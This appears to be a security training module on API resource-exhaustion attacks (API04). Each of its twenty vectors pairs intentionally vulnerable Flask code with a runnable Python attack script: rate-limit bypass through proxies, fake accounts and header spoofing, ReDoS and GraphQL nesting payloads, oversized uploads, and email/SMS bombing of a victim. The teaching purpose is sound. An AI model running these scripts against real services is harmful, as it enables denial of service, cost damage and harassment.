# API04: Unrestricted Resource Consumption - Attack Vectors

## Table of Contents
- [Understanding Attack Vectors](#understanding-attack-vectors)
- [Rate Limit Bypass Techniques](#rate-limit-bypass-techniques)
- [CPU Exhaustion Attacks](#cpu-exhaustion-attacks)
- [Memory Exhaustion Attacks](#memory-exhaustion-attacks)
- [Database Overload Attacks](#database-overload-attacks)
- [Batch Operation Abuse](#batch-operation-abuse)
- [Storage Exhaustion Attacks](#storage-exhaustion-attacks)
- [Network Bandwidth Attacks](#network-bandwidth-attacks)
- [Third-Party Resource Abuse](#third-party-resource-abuse)

## Understanding Attack Vectors

Resource exhaustion attacks exploit the gap between what the API **allows** and what it can **handle**. Attackers use legitimate API functionality to overwhelm system resources, making the service unavailable or degraded for legitimate users.

### Attack Lifecycle

```
1. Reconnaissance
   └─ Identify expensive endpoints
      └─ Test rate limits (if any)
         └─ Map resource consumption patterns

2. Exploitation
   └─ Craft attack requests
      └─ Distribute across IPs/accounts
         └─ Automate at scale

3. Impact
   └─ Resource exhaustion
      └─ Service degradation
         └─ Complete unavailability
```

## Rate Limit Bypass Techniques

Even when rate limiting exists, attackers use various techniques to bypass it.

### Vector 1: IP Rotation
**Method**: Distribute requests across multiple IP addresses.

**Attack Script**:
```python
import requests
import itertools

# Proxy list or cloud VPN endpoints
proxies = [
    {'http': 'http://proxy1.com:8080'},
    {'http': 'http://proxy2.com:8080'},
    {'http': 'http://proxy3.com:8080'},
    # ... hundreds more
]

proxy_pool = itertools.cycle(proxies)

target_url = 'https://api.target.com/expensive-endpoint'

for i in range(10000):
    proxy = next(proxy_pool)
    try:
        response = requests.get(target_url, proxies=proxy)
        print(f"Request {i}: Status {response.status_code}")
    except:
        pass
```

**Why It Works**: Rate limits based only on IP address can't distinguish between different users behind proxies or VPNs.

**Impact**: Bypasses IP-based rate limiting completely.

### Vector 2: User Account Flooding
**Method**: Create many legitimate user accounts to multiply rate limits.

**Attack Script**:
```python
import requests
import random
import string

def random_email():
    return f"{''.join(random.choices(string.ascii_lowercase, k=10))}@temp-mail.com"

api_base = 'https://api.target.com'

# Create 1000 accounts
accounts = []
for i in range(1000):
    email = random_email()
    response = requests.post(f'{api_base}/register', json={
        'email': email,
        'password': 'Password123!'
    })
    if response.status_code == 201:
        # Login to get token
        auth = requests.post(f'{api_base}/login', json={
            'email': email,
            'password': 'Password123!'
        })
        token = auth.json()['token']
        accounts.append(token)

# Now use all accounts to multiply attack capacity
# If limit is 100 req/min per user, 1000 accounts = 100,000 req/min
for token in accounts:
    for i in range(100):
        requests.get(
            f'{api_base}/expensive-operation',
            headers={'Authorization': f'Bearer {token}'}
        )
```

**Why It Works**: Rate limits are typically per-user, so more users = more total capacity.

**Impact**: Multiplies attack capacity by number of accounts.

### Vector 3: Header Manipulation
**Method**: Exploit inconsistent client identification.

**Vulnerable API Logic**:
```python
# API identifies clients by X-Forwarded-For header
client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
rate_limit_key = f"rate_limit:{client_ip}"
```

**Attack**:
```python
for i in range(10000):
    # Fake a different IP each time
    fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    requests.get(
        'https://api.target.com/endpoint',
        headers={'X-Forwarded-For': fake_ip}
    )
```

**Why It Works**: Trusting client-provided headers for rate limiting.

**Impact**: Unlimited requests by spoofing identity.

### Vector 4: Timing-Based Bypass
**Method**: Exploit rate limit window boundaries.

**Attack Pattern**:
```python
import time

# If rate limit is 100 requests per minute (fixed window)
# Attack at window boundaries

def attack_at_boundary():
    # Send 100 requests at 59 seconds
    for i in range(100):
        requests.get('https://api.target.com/endpoint')
    
    # Wait 2 seconds for window reset
    time.sleep(2)
    
    # Send another 100 requests at 1 second of new window
    for i in range(100):
        requests.get('https://api.target.com/endpoint')
    
    # Result: 200 requests in 3 seconds instead of 60 seconds
```

**Why It Works**: Fixed window rate limiting has boundary weaknesses.

**Impact**: 2x rate limit capacity at window boundaries.

### Vector 5: API Key Cycling
**Method**: Rotate through multiple API keys.

```python
api_keys = [
    'key_1_from_free_trial',
    'key_2_from_different_email',
    'key_3_from_temp_account',
    # ... many more
]

for key in itertools.cycle(api_keys):
    requests.get(
        'https://api.target.com/endpoint',
        headers={'X-API-Key': key}
    )
```

**Why It Works**: Free tier API keys can be created in bulk.

**Impact**: Multiplies rate limits by number of keys.

## CPU Exhaustion Attacks

Attacks that maximize CPU usage to slow down or crash the service.

### Vector 6: Regex Denial of Service (ReDoS)
**Method**: Exploit catastrophic backtracking in regular expressions.

**Vulnerable Code**:
```python
import re

@app.route('/api/validate')
def validate():
    user_input = request.args.get('input')
    
    # VULNERABLE: Catastrophic backtracking
    pattern = r'^(a+)+$'
    
    if re.match(pattern, user_input):
        return jsonify({'valid': True})
    return jsonify({'valid': False})
```

**Attack**:
```python
# This string causes exponential backtracking
# Time complexity: O(2^n)
malicious_input = 'a' * 30 + 'b'

requests.get(
    'https://api.target.com/validate',
    params={'input': malicious_input}
)

# This single request can take 10+ seconds and max out a CPU core
```

**Other Vulnerable Patterns**:
```regex
(a+)+
(a|a)*
(a|ab)*
([a-zA-Z]+)*
(.*)*
```

**Why It Works**: Regex engine tries exponentially more combinations.

**Impact**: Single request can consume CPU for seconds/minutes.

### Vector 7: Complex Query Exploitation
**Method**: Craft queries that require maximum computation.

**Vulnerable GraphQL API**:
```graphql
query {
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                # Deep nesting causes N+1 queries
                # Exponential database hits
              }
            }
          }
        }
      }
    }
  }
}
```

**Attack Query**:
```python
complex_query = """
query {
  users(limit: 1000) {
    posts(limit: 100) {
      comments(limit: 100) {
        replies(limit: 100) {
          # 1000 * 100 * 100 * 100 = 100M database queries
        }
      }
    }
  }
}
"""

requests.post(
    'https://api.target.com/graphql',
    json={'query': complex_query}
)
```

**Why It Works**: No depth limiting or query cost analysis.

**Impact**: Single query can trigger millions of database operations.

### Vector 8: Algorithmic Complexity Attack
**Method**: Exploit endpoints with poor algorithmic complexity.

**Vulnerable Code**:
```python
@app.route('/api/sort')
def sort_data():
    # User provides data to sort
    data = request.json['data']
    
    # VULNERABLE: Using bubble sort O(n²)
    def bubble_sort(arr):
        n = len(arr)
        for i in range(n):
            for j in range(0, n-i-1):
                if arr[j] > arr[j+1]:
                    arr[j], arr[j+1] = arr[j+1], arr[j]
        return arr
    
    sorted_data = bubble_sort(data)
    return jsonify(sorted_data)
```

**Attack**:
```python
# Send worst-case data
attack_payload = list(range(100000, 0, -1))  # Reverse sorted

requests.post(
    'https://api.target.com/sort',
    json={'data': attack_payload}
)

# O(n²) with n=100,000 = 10 billion operations
```

**Why It Works**: Inefficient algorithms scale poorly.

**Impact**: CPU exhaustion with single request.

### Vector 9: Cryptographic Workload Amplification
**Method**: Abuse expensive cryptographic operations.

**Vulnerable Code**:
```python
import bcrypt

@app.route('/api/login', methods=['POST'])
def login():
    password = request.json['password']
    
    # VULNERABLE: bcrypt with high work factor
    # Deliberately expensive (good for security, bad without rate limiting)
    hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=14))
    
    # ... check against stored hash
```

**Attack**:
```python
# Parallel login attempts
import concurrent.futures

def attempt_login():
    requests.post('https://api.target.com/login', json={
        'username': 'victim@example.com',
        'password': 'wrong_password'
    })

# 100 concurrent requests
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(attempt_login) for _ in range(100)]
```

**Why It Works**: Each bcrypt operation is intentionally CPU-intensive.

**Impact**: CPU exhaustion even with modest request rate.

## Memory Exhaustion Attacks

Attacks that fill available RAM to crash the service.

### Vector 10: Large Payload Attack
**Method**: Send massive request bodies.

**Vulnerable Code**:
```python
@app.route('/api/process', methods=['POST'])
def process_data():
    # No size limit on request
    data = request.get_json()  # Loads entire JSON into memory
    
    # Process the data
    result = expensive_processing(data)
    return jsonify(result)
```

**Attack**:
```python
# Generate 1GB JSON payload
massive_payload = {
    'data': ['x' * 1000000 for _ in range(1000)]
}

requests.post(
    'https://api.target.com/process',
    json=massive_payload
)

# Multiple concurrent requests = OOM
```

**Why It Works**: No request size validation.

**Impact**: Memory exhaustion, OOM crashes.

### Vector 11: Response Size Explosion
**Method**: Request operations that generate massive responses.

**Vulnerable Code**:
```python
@app.route('/api/users')
def get_users():
    # No pagination
    users = User.query.all()  # 10 million users
    
    # Serialize everything to JSON in memory
    return jsonify([{
        'id': u.id,
        'name': u.name,
        'email': u.email,
        'profile': u.profile,  # Large text field
        'settings': u.settings  # JSON blob
    } for u in users])
```

**Attack**:
```python
# Single request generates multi-GB response
requests.get('https://api.target.com/users')
```

**Why It Works**: No pagination or response size limits.

**Impact**: Server memory exhaustion serializing response.

### Vector 12: Session/Cache Bloat
**Method**: Create massive numbers of sessions or cache entries.

**Attack**:
```python
# Create millions of sessions
for i in range(1000000):
    session = requests.Session()
    session.get('https://api.target.com/')  # Creates server-side session
```

**Why It Works**: No session cleanup or limits.

**Impact**: Memory filled with session data.

## Database Overload Attacks

Attacks targeting database resources.

### Vector 13: Query Flood
**Method**: Overwhelming database with concurrent queries.

**Attack**:
```python
import concurrent.futures

def query_database():
    requests.get('https://api.target.com/search?q=expensive_query')

# 1000 concurrent database queries
with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
    futures = [executor.submit(query_database) for _ in range(1000)]
```

**Why It Works**: No connection pool limits or query queueing.

**Impact**: Database connection pool exhaustion.

### Vector 14: Expensive Join Attack
**Method**: Craft queries that require expensive database operations.

**Vulnerable Code**:
```python
@app.route('/api/reports')
def generate_report():
    # User controls filter parameters
    filters = request.args.to_dict()
    
    # Dynamic query building (VULNERABLE)
    query = db.session.query(Orders)\
        .join(Users)\
        .join(Products)\
        .join(Categories)\
        .join(Suppliers)
    
    for key, value in filters.items():
        query = query.filter(getattr(Orders, key) == value)
    
    results = query.all()
    return jsonify([r.to_dict() for r in results])
```

**Attack**:
```python
# Request with filters that prevent index usage
requests.get('https://api.target.com/reports', params={
    'created_at__gt': '2020-01-01',  # Full table scan
    'amount__lt': '1000000',  # Another full scan
    # Multiple filters forcing massive JOIN
})
```

**Why It Works**: No query optimization, cost limits, or timeouts.

**Impact**: Database CPU and I/O exhaustion.

### Vector 15: Write Amplification
**Method**: Trigger operations that write excessive data.

**Vulnerable Code**:
```python
@app.route('/api/log/event', methods=['POST'])
def log_event():
    event = request.json
    
    # VULNERABLE: No limit on log entries
    Log.create(
        user_id=event['user_id'],
        event_type=event['type'],
        data=event['data']
    )
    
    return jsonify({'status': 'logged'})
```

**Attack**:
```python
# Flood log table with millions of entries
for i in range(1000000):
    requests.post('https://api.target.com/log/event', json={
        'user_id': 123,
        'type': 'spam',
        'data': 'x' * 1000
    })
```

**Why It Works**: No write rate limiting.

**Impact**: Database storage exhaustion, I/O degradation.

## Batch Operation Abuse

Exploiting endpoints that process multiple items.

### Vector 16: Unbounded Batch Size
**Method**: Send batch requests with excessive items.

**Vulnerable Code**:
```python
@app.route('/api/batch/process', methods=['POST'])
def batch_process():
    items = request.json['items']  # No size limit
    
    results = []
    for item in items:
        result = expensive_operation(item)
        results.append(result)
    
    return jsonify(results)
```

**Attack**:
```python
# Send batch with 1 million items
attack_payload = {
    'items': [{'data': 'payload'} for _ in range(1000000)]
}

requests.post('https://api.target.com/batch/process', json=attack_payload)
```

**Why It Works**: No batch size validation.

**Impact**: CPU and memory exhaustion processing massive batch.

### Vector 17: Batch Request Nesting
**Method**: Nest batch operations for multiplication effect.

**Attack**:
```python
# Each batch item is itself a batch request
nested_payload = {
    'items': [
        {
            'type': 'batch',
            'items': [{'data': 'x'} for _ in range(1000)]
        }
        for _ in range(1000)
    ]
}

# 1000 * 1000 = 1 million operations from one request
requests.post('https://api.target.com/batch/process', json=nested_payload)
```

**Why It Works**: No nesting depth validation.

**Impact**: Exponential resource consumption.

## Storage Exhaustion Attacks

Filling available disk space.

### Vector 18: File Upload Spam
**Method**: Upload massive or numerous files.

**Vulnerable Code**:
```python
@app.route('/api/upload', methods=['POST'])
def upload():
    file = request.files['file']
    # No size or type validation
    file.save(f'uploads/{file.filename}')
    return jsonify({'status': 'uploaded'})
```

**Attack**:
```python
# Upload 10GB files repeatedly
large_file = io.BytesIO(b'0' * (10 * 1024 * 1024 * 1024))

for i in range(100):
    files = {'file': (f'spam_{i}.bin', large_file)}
    requests.post('https://api.target.com/upload', files=files)
```

**Why It Works**: No upload size limits or quota enforcement.

**Impact**: Disk space exhaustion.

### Vector 19: Log Explosion
**Method**: Trigger excessive logging.

**Attack**:
```python
# Trigger errors that generate verbose logs
for i in range(100000):
    requests.post('https://api.target.com/endpoint', json={
        'data': 'x' * 100000  # Each error logs 100KB
    })
```

**Why It Works**: Verbose error logging without rotation.

**Impact**: Log files fill disk.

## Third-Party Resource Abuse

Exploiting external service usage.

### Vector 20: Email/SMS Bombing
**Method**: Trigger mass sending of emails or SMS.

**Vulnerable Code**:
```python
@app.route('/api/send-verification')
def send_verification():
    email = request.args.get('email')
    
    # No rate limit on sends
    send_verification_email(email)
    
    return jsonify({'status': 'sent'})
```

**Attack**:
```python
# Trigger 10,000 emails
for i in range(10000):
    requests.get('https://api.target.com/send-verification', params={
        'email': 'victim@example.com'
    })
```

**Why It Works**: No send rate limiting.

**Impact**: 
- Email/SMS service costs
- Service quota exhaustion
- Harassment of victim

## Detection and Reconnaissance

Before launching attacks, attackers identify vulnerable endpoints.

### Reconnaissance Steps

```python
import requests
import time

def find_expensive_endpoints(base_url):
    endpoints = [
        '/api/search',
        '/api/users',
        '/api/reports',
        '/api/export',
        '/api/batch',
    ]
    
    results = []
    for endpoint in endpoints:
        start = time.time()
        
        try:
            response = requests.get(f'{base_url}{endpoint}')
            duration = time.time() - start
            
            results.append({
                'endpoint': endpoint,
                'duration': duration,
                'size': len(response.content),
                'status': response.status_code
            })
        except:
            pass
    
    # Sort by response time (expensive endpoints)
    results.sort(key=lambda x: x['duration'], reverse=True)
    
    return results

# Find slowest endpoints to target
expensive = find_expensive_endpoints('https://api.target.com')
print("Top targets:", expensive[:3])
```

## Combined Attack Scenarios

Real-world attacks often combine multiple vectors.

### Scenario 1: Multi-Vector DoS
```python
# 1. Create multiple accounts (bypass per-user limits)
# 2. Use IP rotation (bypass IP limits)
# 3. Target expensive endpoints (maximize impact)
# 4. Send complex queries (CPU exhaustion)
# 5. Request large responses (memory exhaustion)

# Result: Complete service unavailability
```

### Scenario 2: Cost Amplification
```python
# 1. Identify third-party service usage (emails, SMS, cloud APIs)
# 2. Trigger maximum external service calls
# 3. Generate unexpected bills for target
# 4. Potentially exhaust service quotas

# Result: Financial damage + service disruption
```

## Key Takeaways

1. **Legitimate requests can be weapons** - No "malicious payload" needed
2. **Rate limiting is necessary but insufficient** - Must be combined with resource limits
3. **Every endpoint is a potential attack vector** - Comprehensive protection required
4. **Attackers use economics** - Maximize damage while minimizing cost
5. **Bypass techniques are well-known** - Simple rate limiting is easily defeated
6. **Complexity is exploitable** - Simple is more secure

## Next Steps

- **Learn Prevention** → [prevention.md](./prevention.md) - Implement robust defenses
- **Study Examples** → [examples.md](./examples.md) - See working implementations
- **Practice** → [lab/](./lab/api04-rate-limiting-lab/) - Exploit and fix vulnerabilities
